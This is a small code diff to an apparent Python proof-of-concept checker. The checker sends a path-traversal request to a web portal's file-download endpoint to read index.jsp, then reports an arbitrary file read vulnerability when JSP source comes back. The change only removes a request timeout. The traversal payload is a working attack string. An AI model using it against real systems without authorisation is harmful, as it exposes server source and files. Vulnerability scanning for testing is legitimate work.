@@ -44,7 +44,7 @@ class poc:
     def vuln(self, netloc, scheme):
         url = "{}://{}/portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp".format(scheme, netloc)
         try:
-            result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
             if "<%" in result.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件读取漏洞\033[0m
